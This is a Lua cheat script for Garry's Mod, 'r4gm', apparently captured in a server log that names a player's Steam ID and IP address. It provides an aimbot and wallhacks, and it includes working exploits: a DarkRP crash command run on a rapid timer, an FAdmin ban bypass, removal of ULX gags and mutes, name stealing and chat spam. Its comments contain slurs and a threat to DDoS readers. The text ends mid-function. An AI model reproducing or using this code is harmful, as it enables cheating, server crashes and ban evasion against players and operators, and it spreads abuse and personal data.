--[[
	MOD/lua/nyxHook.lua [#118183 (#121615), 399435854]
	Pengo | STEAM_0:1:68768379 <84.193.117.162:27005> | [15.02.14 08:48:06PM]
	===BadFile===
]]

/**********************************************************
	r4gm Alpha:
===========================================================
  Credits:
	ph0ne
	fr1kin
	noPE
	TheyCallMeDaz
	TheOneWithTheBeans
	MeepDarknessMeep
	x0F
	Liquidsocks
	TheMikuChibi
  
  If you read this, you're gonna eat a 600GB/s Distributed Denial of Service Attack.
**********************************************************/


if( !CLIENT ) then 
	return; end
	
if( NYX ) then 
	_G['NYX'] = nil;
end

require( "nyx" );

_nyx['Init']();

surface['CreateFont']( "fonty2", { font = "Lucida Console", size = 12, antialias	= false } );
local fontsize = 14
surface['CreateFont']( "fonty", { font = "HL2MPTypeDeath", size = fontsize, antialias	= false } );
--local WireframeMat = (CreateMaterial( "wireframe", "Wireframe", { ["$basetexture"] = "models/debug/debugwhite", ["$model"] = 1, ["$ignorez"] = 1, ["$nocull"] = 1 } ))
local ChamsMat = (CreateMaterial( "chams", "VertexLitGeneric", { ["$basetexture"] = "models/debug/debugwhite", ["$model"] = 1, ["$ignorez"] = 1, ["$nocull"] = 1 } ))

/*********************************************
LOCALISATION
*********************************************/
local NYX 		= {};
-- I store this here cause i'm a Huge Flamming Faggot ~TheMikuChibi
NYX['HackName'] 	= 'r4gm'; -- Without this, the skid you are won't be able to rename the hack easily and we won't get a new Hera :( #TyLErWeARInG
NYX['HackVersion'] 	= 'v2'; -- Maybe implant an update system later ?

-- Rest is shit, k ?
NYX['keys']			= {};
NYX['detours']		= {};
NYX['hooks']		= {};
NYX['coners']		= {};
NYX['spectators']	= {};
NYX['admins']		= {};
NYX['murderer']		= {};
NYX['secretbystander']	= {};
NYX['distance'] 	= 9999999999;
NYX['target']		= nil;
NYX['aimpos']		= Angle( 0, 0, 0 );
NYX['aiming']		= false;
NYX['speeding'] 	= false;
NYX['testing']		= false;
NYX['entsmenu']		= false;
NYX['entities']		= {};
NYX['traitorsweapons'] = {
"weapon_ttt_c4",
"weapon_ttt_knife", 
"weapon_ttt_phammer", 
"weapon_ttt_sipistol", 
"weapon_ttt_flaregun", 
"weapon_ttt_push", 
"weapon_ttt_radio", 
"weapon_ttt_teleport", 
"(Disguise)", 
}

/*********************************************
MAIN ROUTINE FUNCTIONS
*********************************************/
function NYX:BindKey( key, _var, _mouse )
    NYX['keys'][key] = { var = _var, mouse = _mouse };
end

function NYX:IsAdmin( v )
	if !v:IsUserGroup( "user" ) && !v:IsUserGroup( "guest" ) && !v:IsUserGroup( "RANK1" ) && !v:IsUserGroup( "RANK2" ) && !v:IsUserGroup( "RANK3" ) && !v:IsUserGroup( "RANK4" ) && !v:IsUserGroup( "RANK5" ) && !v:IsUserGroup( "RANK6" ) && !v:IsUserGroup( "RANK7" ) && !v:IsUserGroup( "RANK8" ) && !v:IsUserGroup( "RANK9" ) && !v:IsUserGroup( "RANK10" ) && !v:IsUserGroup( "RANK11" ) && !v:IsUserGroup( "RANK12" ) && !v:IsUserGroup( "RANK13" ) && !v:IsUserGroup( "RANK14" ) then
		return true; 
	end -- Why searching if a player is an admin when you can search if it's just a normal player and ignore it ?
	return false;
end

function NYX:GetCoordinates(v)
    local min,max = v:OBBMins(),v:OBBMaxs()
    local corners = {
        Vector(min.x,min.y,min.z),
        Vector(min.x,min.y,max.z),
        Vector(min.x,max.y,min.z),
        Vector(min.x,max.y,max.z),
        Vector(max.x,min.y,min.z),
        Vector(max.x,min.y,max.z),
        Vector(max.x,max.y,min.z),
        Vector(max.x,max.y,max.z)
    }

    local minx,miny,maxx,maxy = ScrW() * 2,ScrH() * 2,0,0
    for _,corner in pairs(corners) do
        local screen = v:LocalToWorld(corner):ToScreen()
        minx,miny = math.min(minx,screen.x),math.min(miny,screen.y)
        maxx,maxy = math.max(maxx,screen.x),math.max(maxy,screen.y)
    end
    return minx,miny,maxx,maxy
end

function NYX:drawBlip(x, y, col)
	surface.SetDrawColor(Color(1,1,1,255))
		surface.DrawRect(x - 2, y - 2, 5, 5)
	surface.SetDrawColor(col)
		surface.DrawRect(x - 1, y - 1, 3, 3)
end

local Cap = math.cos(math.rad(45))
local Offset = Vector(0, 0, 32)
local Trace = {}
backgroundcol = Color(0, 0, 0, 0)

local BackCam = {}
BackCam.x = ScrW() / 2 - 200
BackCam.y = 30
BackCam.w = 400
BackCam.h = 150

local MurderCam = {}
MurderCam.x = ScrW() - ScrW() / 5 - 10
MurderCam.y = ScrH() / 2 - ScrH() / 5
MurderCam.w = ScrW() / 5
MurderCam.h = ScrH() / 5

/*********************************************
VARIABLES
*********************************************/
-- AIMBOT \\
local AIM_Ignore_SteamFriends 		= true;
local AIM_Ignore_Team 				= false;
local AIM_Ignore_Traitors 			= true;
local AIM_Ignore_SpawnProtection 	= true;
local AIM_Ignore_Admins 			= false;
local AIM_RapidFire 				= false;
local AIM_AutoDuck 					= false;
local AIM_AutoAim 					= false;
local AIM_Ignore_TKZBuildMode 		= true;
local AIM_Offset 					= 0;
local AIM_Ignore_Team_Color			= false;
local AIM_Only_Murderer				= false;
local AIM_gSilent					= false;
local AIM_COG_Ignore				= false;

-- ESP-VISUALS \\
local ESP_Box_2D 					= true;
local ESP_Murder_Loot 				= false;
local ESP_Murder 					= false;
local ESP_Crosshair 				= true;
local ESP_Box_3D 					= false;
local ESP_Name 						= true;
local ESP_Health 					= true;
local ESP_Weapon 					= true;
local ESP_AdminList 				= true;
local ESP_SpectatorsList 			= true;
local ESP_Barrel	 				= false;
local ESP_Witness					= false;
local ESP_Radar						= false;
local ESP_Radar_Crosshair			= false;
local ESP_Money						= false;
local ESP_Ents_Class				= false;
local ESP_Ents_Glow					= false;
local ESP_Ents_Wallhack				= false;
local ESP_NoVisuals					= false;
local ESP_Panic						= false;
local ESP_BackCam					= false;
local ESP_Murder_Cam				= false;
local ESP_Traitors					= false;
local ESP_SnapLines					= false;
local ESP_SnapLines_Crosshair		= false;
local ESP_CustomColorScheme			= false;
local ESP_Ignore_Team				= false;
local ESP_Distance					= true;

-- MISC \\
local MISC_BunnyHop					= true;
local MISC_DarkRPCrash				= false;
local MISC_DarkRPNameSteal			= false;
local MISC_AutistSpam				= false;
local MISC_Debug					= false;
local MISC_Murder_Spoil				= false;
local MISC_Spectators_Spoil			= false;

/*********************************************
EXPLOITS
*********************************************/
CreateClientConVar("spammyass"," ",true,false)
CreateClientConVar("baner","",true,false)
CreateClientConVar("benervar","0",false,false)
local next_change = 5 + 0.5
local next_spam = 1.25

function chatNotify(col, notification)
	chat.AddText(Color(0,255,0), "["..NYX['HackName'].." "..NYX['HackVersion'].."] ",
	col, notification
	)
end

function NameStealer()
	-- DarkRP NameStealer --
		local ply = LocalPlayer()
		local v = player.GetAll()[ math.random( 1, #player.GetAll() ) ]
		local curtime = CurTime()
				if next_change < curtime then
					if ( v != ply && MISC_DarkRPNameSteal == true ) then
						timer.Create("TMCWasHere", 1, 1 , function()
							LocalPlayer():ConCommand("say /rpname ".. v:Nick() .. " " )
						end)
					end
				end
end
timer.Create( "NameSteal", next_change , 0 , function() NameStealer() end )

function AutisticSpammer()
	-- AUTISTIC SPAM --
		local curtime = CurTime()
			if next_spam < curtime then
				if ( MISC_AutistSpam == true ) then
					timer.Create("SPAMTHEBITCH", 1, 1 , function()
						LocalPlayer():ConCommand("say "..GetConVarString("spammyass"))
					end)
				end
			end
end
timer.Create( "Asperger", next_spam , 0 , function() AutisticSpammer() end )

function RunExploits()
	-- DarkRP Player Crash --
		if (MISC_DarkRPCrash == true) then
			RunConsoleCommand("_DarkRP_DoAnimation", "-1921")
		end
end
timer.Create( "Autism", 0.00001 , 0 , function() RunExploits() end )

function fdmnbpss()
chat.AddText(Color(255,0,0), "Bypassing FAdmin")
hook.Add("Think","fdbps", function()
	for k, v in pairs( hook.GetTable().HUDPaint ) do
		if k == "FAdmin_ban" then
			hook.Remove("HUDPaint", "FAdmin_ban")
			RunConsoleCommand("retry","")
			print("Ban evaded!")
		end
	end
	end)
end
fdmnbpss()

function GetAway()
    RunConsoleCommand("say", "/sleep")
    timer.Simple(0.5, function()
		RunConsoleCommand("say", "/wakeup")
    end)
end
concommand.Add("getaway", GetAway)

local function DisarmC4()
	for k, v in pairs( ents.FindByClass( "ttt_c4" ) ) do
		if IsValid(envy) then
			for i = 1,6 do
			RunConsoleCommand( "ttt_c4_disarm", tostring(v:EntIndex()), tostring(i) )
			end
		end
	end
end
concommand.Add("DisarmC4",DisarmC4)

if LocalPlayer():GetNWBool("Muted") then
	LocalPlayer():SetNWBool("Muted", false)
end
hook.Remove("PlayerBindPress", "ULXGagForce")
timer.Destroy("GagLocalPlayer")

if LocalPlayer():GetNWBool("EV_Blinded") then
	LocalPlayer():SetNWBool("EV_Blinded", false)
end

-- Traitor finder functions
/*
local PlayerIsTraitor = false
timer.Simple( 3, function()
	if ( gmod.GetGamemode().Name ) == "Trouble in Terrorist Town" then
		local UsedWeapons = {}
		local MapWeapons = {}
function bIsTraitor( ply )
	for k, v in pairs( Hera.traitors ) do
		if v == ply then
			return true
		else
			return false
		end
	end
end)))
*/

function InFov( ent )
	local fov = 89
	if( fov != 180 ) then
		local lpang = LocalPlayer():GetAngles()
		local ang = ( ent:GetPos() - LocalPlayer():EyePos() ):Angle()
		local ady = math.abs( math.NormalizeAngle( lpang.y - ang.y ) )
		local adp = math.abs( math.NormalizeAngle( lpang.p - ang.p ) )
		if( ady > fov || adp > fov ) then return false end
	end
	return true
end

function DrawArrow(x, y, myRotation)
	local arrow = {}       
		arrow[1] = {x = x, y = y}
		arrow[2] = {x = x + 4, y = y + 7.5}
		arrow[3] = {x = x, y = y + 5}
		arrow[4] = {x = x - 4, y = y + 7.5}

		--Now that i have the arrow determined, i have to rotate it to match the targets angle
		myRotation = myRotation * -1
		myRotation = math.rad(myRotation)
	for i = 1, 4 do
		local theirX = arrow[i].x
		local theirY = arrow[i].y

		theirX = theirX - x
		theirY = theirY - y
							   
		arrow[i].x = theirX * math.cos(myRotation) - theirY * math.sin(myRotation)
		arrow[i].y = theirX * math.sin(myRotation) + theirY * math.cos(myRotation)
							   
		arrow[i].x = arrow[i].x + x
		arrow[i].y = arrow[i].y + y
	end

	surface.DrawPoly(arrow)
end

/************************************************************
ULX Extended 'Ban' Exploit
************************************************************/

------------------------------/ GETTING THE MESSAGE (USELESS ?) ------------------------------/
local function receive_message(len, ply)
	local IDNick = net.ReadString()
	local datatable = string.Explode("{sep}",IDNick)
	local steamid = datatable[1]
	local nick = datatable[2]
		ULib.addBan( steamid, 0, "Avoiding punishment", nick, ply )
		ulx.fancyLogAdmin( ply, "#A banned #s(#s) for avoiding punishment!",nick,steamid)
end
net.Receive("banleaver", receive_message)


concommand.Add( "suicide",function( ply,args )
	--ply:Kill()
end )

function writeOnLog(shouldNiggerUp,writeme)
	if !file.Exists(NYX['HackName'].."/mySQL_logs.txt","DATA") then
		file.Write(NYX['HackName'].."/mySQL_logs.txt","Log started "..os.date().." \n")
	end
	file.Append(NYX['HackName'].."/mySQL_logs.txt","["..os.date().."]: "..writeme.."\n")
	if (shouldNiggerUp == 1)then
		chatNotify(Color(255,50,0), writeme)
	end
end

/*********************************************
KEYS
*********************************************/
NYX:BindKey( KEY_A, 'speeding', false );
NYX:BindKey( KEY_F, 'aiming', false );
NYX:BindKey( KEY_DELETE, 'entsmenu', false );
--hook.Add('PlayerConnect','\2\3',function(ye,mang) file.Append('loggedip.txt','Player: '..ye..' IP: '..mang) end)

/*********************************************
VISUALS
*********************************************/
function NYX.List()
	local AListPos = fontsize;
	local SListPos = 270+fontsize;
	draw['SimpleTextOutlined']( NYX['HackName'].." "..NYX['HackVersion'], "fonty", 2, 2, white, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT, 1, Color( 0, 0, 0, 255 ) );
	
	for k, v in pairs( player['GetAll']() ) do
		-- SPECTAFAGS --
			if (IsValid(v:GetObserverTarget()) and v:GetObserverTarget():IsPlayer() and v:GetObserverTarget() == LocalPlayer()) then
				if(not table.HasValue(NYX['spectators'], v)) then
					table.insert(NYX['spectators'], v);
						col = Color(255, 0, 0, 255)
						chat.AddText(col, "["..NYX['HackName'].."] "..v:Name().." is now specfagging you !")
						if (MISC_Spectators_Spoil == true) then
							RunConsoleCommand("say", "["..NYX['HackName'].."] "..v:Name().." is now specfagging me !")
						end
						surface.PlaySound("buttons/blip1.wav")
				end
			end
			for k, v in pairs(NYX['spectators']) do
				if (not IsValid(v) or not IsValid(v:GetObserverTarget()) or not v:GetObserverTarget():IsPlayer() or (v:GetObserverTarget() ~= LocalPlayer())) then
					table.remove(NYX['spectators'], k);
						col = Color(0, 255, 0, 255)
						if IsValid(v) then
							chat.AddText(col, "["..NYX['HackName'].."] "..v:Name().." is no longer specfagging you.")
							if (MISC_Spectators_Spoil == true) then
								RunConsoleCommand("say", "["..NYX['HackName'].."] "..v:Name().." is no longer specfagging me.")
							end
						end
				end
			end
			if (ESP_SpectatorsList == true) then 
				draw['SimpleTextOutlined']( "Spectators:", "fonty", 2, 270, colorRandom, TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT, 1, Color( 0, 0, 0, 255 ) );
					if (IsValid(v:GetObserverTarget()) and v:GetObserverTarget():IsPlayer() and v:GetObserverTarget() == LocalPlayer()) then
						draw['SimpleTextOutlined']( v:Nick(), "fonty", 2, SListPos, Color( 255, 80, 80, 255 ), TEXT_ALIGN_LEFT, TEXT_ALIGN_LEFT, 1, Color( 0, 0, 0, 255 ) );
						SListPos = SListPos + fontsize;
					end
			end

		-- BADMINS --
			if (ESP_AdminList == true) then 
				draw['SimpleTextOutlined']( "Admins:", "fonty", ScrW()-2, 2, colorRandom, TEXT_ALIGN_RIGHT, TEXT_ALIGN_RIGHT, 1, Color( 0, 0, 0, 255 ) );
					if( NYX:IsAdmin( v ) ) then
						draw['SimpleTextOutlined']( v:Nick(), "fonty", ScrW()-2, AListPos, Color( 255, 80, 80, 255 ), TEXT_ALIGN_RIGHT, TEXT_ALIGN_RIGHT, 1, Color( 0, 0, 0, 255 ) );
						AListPos = AListPos + fontsize;
					end
			end
	end
end

function NYX.Draw()
NYX['List']()
if (ESP_Panic == true) then return false end
if (ESP_NoVisuals == true) then return false end

/*******************************************
NOT IN LOOP
*******************************************/
-- ======================================================================================================================================================================================================== --
	if (ESP_Murder_Loot == true) then	
		for k, v in pairs( ents["FindByClass"]("mu_loot") ) do
			local pos = ( v:GetPos() + Vector( 0, 0, 10 ) ):ToScreen();
			col = Color(0,255,0,255)
			draw["SimpleTextOutlined"]( "Loot", fonty, pos.x, pos.y, col, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
			halo["Add"]( {v}, col, 2, 2, 1, true, true )
		end
	end

	-- BACK CAMERA --
		if (ESP_BackCam == true) then
			surface.SetDrawColor( 40, 40, 40, 200)
				surface.DrawRect(BackCam.x-5 , BackCam.y-5, BackCam.w+10, BackCam.h+30 )
				BackCam.angles = Angle(0,LocalPlayer():EyeAngles().yaw-180,0) ---LocalPlayer():EyeAngles().pitch
				BackCam.origin = LocalPlayer():GetPos()+Vector(0,0,60)
				render.RenderView( BackCam )
				draw.SimpleTextOutlined("Back Camera","Default",(BackCam.x)+(BackCam.w/2), (BackCam.y)+(BackCam.h+12.5),white,TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,0.1,black)
		end
						
	-- RADAR BACKGROUND --
		if (ESP_Radar == true) then
			if (ESP_Radar_Crosshair == true) then
				rradius = 120
				radius = 1024
				ratio = rradius / radius
				orgx = ScrW()/2-120
				orgy = ScrH()/2-120
				backgroundcol = Color(0, 0, 0, 0)
			else
				rradius = 120
				radius = 1024
				ratio = rradius / radius
				orgx = 5 --BackCam.x + BackCam.w + 10
				orgy = 25 --BackCam.y
				backgroundcol = Color(240, 240, 240, 255)
			end
			
			if (ESP_Radar_Crosshair == false) then
				surface.SetDrawColor(Color(0,0,0,255))
					surface.DrawRect(orgx+1, orgy+1, 2 * rradius+1, 2 * rradius+1)
			end
			
			surface.SetDrawColor(backgroundcol)
				surface.DrawRect(orgx, orgy, 2 * rradius, 2 * rradius)

				
			surface.SetDrawColor(Color(0, 0, 0, 255))
				surface.DrawLine(orgx + rradius, orgy, orgx + rradius, orgy + 2 * rradius)
				surface.DrawLine(orgx, orgy + rradius, orgx + 2 * rradius, orgy + rradius)
		end
		
	-- CROSSHAIR --
		if (ESP_Crosshair == true) then 		
			lAimPos = (LocalPlayer():GetEyeTrace().HitPos):ToScreen()
			surface.SetDrawColor(50,50,50,200)
				surface.DrawRect(lAimPos.x-2.5, lAimPos.y-2.5, 5, 5 )
			surface.SetDrawColor(team.GetColor(LocalPlayer():Team()))
				surface.DrawRect(lAimPos.x-1.5, lAimPos.y-1.5, 3, 3 )
			--surface.DrawLine(ScrW() / 2 - 10, ScrH() / 2, ScrW() / 2 + 10 , ScrH() / 2)
			--surface.DrawLine(ScrW() / 2 - 0, ScrH() / 2 - 10, ScrW() / 2 - 0 , ScrH() / 2 + 10)
		end
-- ======================================================================================================================================================================================================== --

for k, v in pairs( ents['FindByClass']("npc_*")) do
	if( !_nyx['IsDormant']( v:EntIndex() ) ) then
-- ======================================================================================================================================================================================================== --
	local x1,y1,x2,y2 = NYX:GetCoordinates(v)
	col = Color(255,150,0,255)
	local hp = v:Health()
	local hCol = Color(255 - 2.55 * hp, 2.55 * hp, 0, 255)
		
	-- NAME ESP --
		if (ESP_Name == true) then 
			draw['SimpleTextOutlined']( v:GetClass(), "fonty", x1, y1 - 8, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) ); --OUTLINE 1
		end
				
	-- WEAPON ESP --
		if (ESP_Weapon == true && v:IsNPC()) then
			if v:GetActiveWeapon() != nil then
				if type(v:GetActiveWeapon()) == "Weapon" then
					if v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() then
						wep = v:GetActiveWeapon():GetPrintName()
						draw.SimpleTextOutlined(wep,"fonty", x1, y2 + 8 ,col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) )
					end
				end
			end
		end

	-- DISTANCE ESP --
		if (ESP_Distance == true) then
			Distance = LocalPlayer():GetPos():Distance(v:GetPos())
			AimPos = (NYX:GetAimPos(v)):ToScreen()
			
			draw.SimpleTextOutlined(math.floor(Distance).."m","fonty", x2+4, y1 + 7 ,col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) )
			surface.SetDrawColor(50,50,50,200)
				surface.DrawRect(AimPos.x-2.5, AimPos.y-2.5, 5, 5 )
			surface.SetDrawColor(col)
				surface.DrawRect(AimPos.x-1.5, AimPos.y-1.5, 3, 3 )
		end
		
	-- SNAP LINES --
		if (ESP_SnapLines == true && InFov(v)) then
			surface.SetDrawColor(col)
			xpos = x1 + (x2 - x1)/2
				if (ESP_SnapLines_Crosshair) then
					surface.DrawLine( ScrW()/2, ScrH()/2, xpos ,y2 )
				else
					surface.DrawLine( ScrW()/2, ScrH(), xpos ,y2 )
				end
		end
		
	-- Health Bar --
		if (ESP_Health == true && InFov(v)) then
			local diff
			local health
		
			if ( y2 > y1 ) then 
				diff = y2 - y1 
			else 
				diff = y1 - y2 
			end
			
			if v:Health() > 100 then
				health = 100
			elseif v:Health() <= 0 then
				health = 0
			else
				health = v:Health()
			end
			
			local hpbarheight = ( v:Health() * diff ) / 100		
			
					surface.SetDrawColor( Color(5,5,5) )
					
						-- Left - Gauche
						surface.DrawLine( x1-8, y2+2, x1-8,y1-2 )
						--surface.DrawLine( x1-10, y2+2, x1-10,y1-2 )
				
						-- Bottom - Bas
						surface.DrawLine( x1-8, y2+1, x1-5,y2+1 )
						--surface.DrawLine( x1-10, y2+2, x1-3,y2+2 )
						
						-- Top - Haut
						surface.DrawLine( x1-8, y1-1, x1-5,y1-1 )
						--surface.DrawLine( x1-10, y1-2, x1-3,y1-2 )
						
						-- Right - Droite
						surface.DrawLine( x1-5, y2+2, x1-5,y1-2 )
						--surface.DrawLine( x1-4, y2+2, x1-4,y1-2 )
						
						
					surface.SetDrawColor( hCol )
						--surface.DrawLine( x1-8, y2, x1-8,y2-hpbarheight )
						surface.DrawLine( x1-7, y2, x1-7,y2-hpbarheight )
						surface.DrawLine( x1-6, y2, x1-6,y2-hpbarheight )
						--surface.DrawLine( x1-5, y2, x1-5,y2-hpbarheight )
		end
		
	-- 2D Boxes --
		if (ESP_Box_2D == true && InFov(v)) then		

				/*
					x1	y1	x2	
					
					
					
					
					
					x1	y2	x2
				*/
				

				surface.SetDrawColor( Color(5,5,5) )
					-- Top
					surface.DrawLine(x1-1,y1-1,x2+1,y1-1) -- Top
					surface.DrawLine(x1-1,y2+1,x2+1,y2+1) -- Bottom
					
					-- Bottom
					surface.DrawLine(x1-1,y1+1,x2+1,y1+1) -- Top
					surface.DrawLine(x1-1,y2-1,x2+1,y2-1) -- Bottom
					
					-- Left
					surface.DrawLine(x1+1,y1-1,x1+1,y2+1) -- Left
					surface.DrawLine(x2-1,y1-1,x2-1,y2+1) -- Right
					
					-- Right
					surface.DrawLine(x1-1,y1-1,x1-1,y2+1) -- Left
					surface.DrawLine(x2+1,y1-1,x2+1,y2+1) -- Right
					
					
				surface.SetDrawColor(col)
					surface.DrawLine(x1,y1,x1,y2) -- Left
					surface.DrawLine(x2,y1,x2,y2) -- Right
					surface.DrawLine(x1,y1,x2,y1) -- Top
					surface.DrawLine(x1,y2,x2,y2) -- Bottom
					
					--surface.DrawLine(x1,y2,x1,y1)
					--surface.DrawLine(x2,y1,x1,y1)
					--surface.DrawLine(x1,y1,x1,y2)
					--surface.DrawLine(x1,y1,x2,y1)
					--surface.DrawLine(x2,y1,x2,y2)
					--surface.DrawLine(x1,y2,x2,y2)
					--surface.DrawLine(x2,y2,x2,y1)
					--surface.DrawLine(x2,y2,x1,y2)
					
				--surface.SetDrawColor( col )
					--surface.DrawLine( x1-5, y1, x1-5,y2 )
					--surface.DrawLine(x1,y1,x1-5,y1)
					--surface.DrawLine(x1,y2,x1-5,y2)

		end	
		
	-- 3D Boxes --
		if (ESP_Box_3D == true) then
			local c, d 	= v:GetCollisionBounds()
				if (c && d) then
					local v1 = v:LocalToWorld(c) -- Vectors and shit. Look at the 2D.
					local v2 = v:LocalToWorld(Vector(c.x, c.y, d.z))
					local v3 = v:LocalToWorld(Vector(c.x, c.y + (d.y * 2), c.z))
					local v4 = v:LocalToWorld(Vector(c.x + (d.x * 2), c.y, c.z))
					local v5 = v:LocalToWorld(d)
					local v6 = v:LocalToWorld(Vector(d.x, d.y, c.z))
					local v7 = v:LocalToWorld(Vector(d.x, d.y + (c.y * 2), d.z))
					local v8 = v:LocalToWorld(Vector(d.x + (c.x * 2), d.y, d.z))
						
					v1 = v1:ToScreen() -- ToScreening it.
					v2 = v2:ToScreen()
					v3 = v3:ToScreen()
					v4 = v4:ToScreen()
					v5 = v5:ToScreen()
					v6 = v6:ToScreen()
					v7 = v7:ToScreen()
					v8 = v8:ToScreen()
						
					local function connect(box1, box2) -- Creating a function for dem yoloz.
						surface.DrawLine(box1.x, box1.y, box2.x, box2.y)
					end

					surface.SetDrawColor(col) -- Don't forget dem color.
						connect(v1, v2) -- Connect the lines. See the function.
						connect(v3, v8)
						connect(v4, v7)
						connect(v6, v5)
						connect(v4, v6)
						connect(v4, v1)
						connect(v1, v3)
						connect(v3, v6)
						connect(v5, v8)
						connect(v8, v2)
						connect(v2, v7)
						connect(v7, v5)
				end
		end
		
		
		
	-- RADAR --	
		if (ESP_Radar == true) then
					
			--local ps = {}
			
			local origin = LocalPlayer():GetPos()
			local yaw = -1 * LocalPlayer():EyeAngles().y - 90
						
				local lbound = origin.x - radius
				local tbound = origin.y - radius
				
				local x = ratio * (v:GetPos().x - lbound) - rradius
				local y = ratio * (v:GetPos().y - tbound) - rradius
				local rx = -1 * (x * math.cos(math.rad(yaw)) - y * math.sin(math.rad(yaw)))
				local ry = x * math.sin(math.rad(yaw)) + y * math.cos(math.rad(yaw))
				
				local dx = rx
				local dy = ry
				
				if (ESP_Radar_Crosshair == true) then
					if (math.abs(dx) + 1 && math.abs(dy) + 1) then
					--	DrawArrow(dx + orgx + rradius, dy + orgy + rradius, v:EyeAngles().y - LocalPlayer():EyeAngles().y)
						NYX:drawBlip(dx + orgx + rradius, dy + orgy + rradius, col)
					end
				else
					if (math.abs(dx) + 1 <= rradius && math.abs(dy) + 1 <= rradius) then
					--	DrawArrow(dx + orgx + rradius, dy + orgy + rradius, v:EyeAngles().y - LocalPlayer():EyeAngles().y)
						NYX:drawBlip(dx + orgx + rradius, dy + orgy + rradius, col)
					end
				end
		
		end
		
-- ======================================================================================================================================================================================================== --
	end
end
for k, v in pairs( player['GetAll']() ) do

--	halo["Add"]( {v}, Color(0,0,0,0), 0, 0, 0, false, false )
/*******************************************
INSIDE CONDITIONS
*******************************************/
-- ======================================================================================================================================================================================================== --
	if( v:Alive() && v:Team() != TEAM_SPECTATOR && v != LocalPlayer() && !_nyx['IsDormant']( v:EntIndex() ) ) then

	if (v:Team() == LocalPlayer():Team() && ESP_Ignore_Team == true) then return end

	local x1,y1,x2,y2 = NYX:GetCoordinates(v)
	--local xpos = x1+((x2-x1)/2)
		
	-- COLORS --
		if( v:GetFriendStatus() == "friend" ) then
			col = Color( 100, 255, 0, 255 )
		elseif NYX:IsAdmin(v) then
			col = Color(math['random'](1,255),math['random'](1,255),math['random'](1,255))
		--elseif v == NYX['target'] then
		--	col = Color( 10, 130, 255, 255 )
		elseif (ESP_CustomColorScheme == true) then
			if (v:Team() == LocalPlayer():Team() && AIM_Ignore_Team == true) then
				col = Color( 0, 90, 255, 255 )
			else
				col = Color( 230, 10, 0, 255 )
			end
		elseif table['HasValue'](NYX['murderer'],v) then
			col = Color( 250, 30, 0, 255 )
	--	elseif table['HasValue'](NYX['secretbystander'],v) then
	--		col = Color( 30, 255, 0, 255 )
		else
			tcol = team['GetColor'](v:Team())
			col = Color(tcol.r,tcol.g,tcol.b,255)
		end
				
		local hp = v:Health()
		local hCol = Color(255 - 2.55 * hp, 2.55 * hp, 0, 255)

	-- TRAITOR ESP --
		if (ESP_Traitors == true) then
			for _, wep in pairs( v:GetWeapons() ) do
				for wepk, wepv in pairs( NYX['traitorsweapons'] ) do
					if (wep:GetClass() == wepv) then
						local pos = ( wep:GetPos() + Vector( 0,0,20 ) ):ToScreen()
						draw["SimpleTextOutlined"]( "[ TRAITOR ]", fonty, pos.x, pos.y, Color(255,20,0,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
					end
				end
			end
		end
		
	-- NAME ESP --
		if (ESP_Name == true) then 
			draw['SimpleTextOutlined']( v:Nick(), "fonty", x1, y1 - 8, col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) ); --OUTLINE 1
		end
				
	-- WEAPON ESP --
		if (ESP_Weapon == true) then
			if v:GetActiveWeapon() != nil then
				if type(v:GetActiveWeapon()) == "Weapon" then
					if v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() then
						wep = v:GetActiveWeapon():GetPrintName()
						draw.SimpleTextOutlined(wep,"fonty", x1, y2 + 8 ,col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) )
					end
				end
			end
		end
		
	-- MONEY ESP --
		if (ESP_Money == true && string.find( GAMEMODE.Name , "DarkRP" )) then
			v.DarkRPVars = v.DarkRPVars or {}
			draw.SimpleTextOutlined("$" ..v.DarkRPVars.money,"fonty", x2+4, y1 + 20 ,col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) )
		end
		
	-- DISTANCE ESP --
		if (ESP_Distance == true) then
			Distance = LocalPlayer():GetPos():Distance(v:GetPos())
			AimPos = (NYX:GetAimPos(v)):ToScreen()
			
			draw.SimpleTextOutlined(math.floor(Distance).."m","fonty", x2+4, y1 + 7 ,col, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER, 1, Color( 0, 0, 0, 255 ) )
			surface.SetDrawColor(50,50,50,200)
				surface.DrawRect(AimPos.x-2.5, AimPos.y-2.5, 5, 5 )
			surface.SetDrawColor(col)
				surface.DrawRect(AimPos.x-1.5, AimPos.y-1.5, 3, 3 )
		end
		
	-- SNAP LINES --
		if (ESP_SnapLines == true && InFov(v)) then
			surface.SetDrawColor(col)
			xpos = x1 + (x2 - x1)/2
				if (ESP_SnapLines_Crosshair) then
					surface.DrawLine( ScrW()/2, ScrH()/2, xpos ,y2 )
				else
					surface.DrawLine( ScrW()/2, ScrH(), xpos ,y2 )
				end
		end
		
	-- BARREL ESP --
		if (ESP_Barrel == true) then
			if v:GetActiveWeapon() != nil then
				if type(v:GetActiveWeapon()) == "Weapon" then
					if v:GetActiveWeapon() and v:GetActiveWeapon():IsValid() then
						local n1, n2 = (v:GetShootPos()):ToScreen(), (v:GetEyeTrace().HitPos):ToScreen()
						surface.SetDrawColor(col)
							surface.DrawLine( n1.x, n1.y, n2.x, n2.y )
					/*

								cam.Start3D(EyePos(), EyeAngles())
									render.SetMaterial(Material("trails/laser"))
										render.DrawBeam(v:GetShootPos(), v:GetEyeTrace().HitPos , 5, 0, 0, col)
										render.SetMaterial(Material("Sprites/light_glow02_add_noz"))
										render.DrawQuadEasy(v:GetShootPos(), (EyePos() - v:GetBonePosition(Bone)), 50, 50, Color(255,0,0,255), 0 )
								cam.End3D()
					*/
					end
				end
			end
		end

	-- Health Bar --
		if (ESP_Health == true && InFov(v)) then
			local diff
			local health
		
			if ( y2 > y1 ) then 
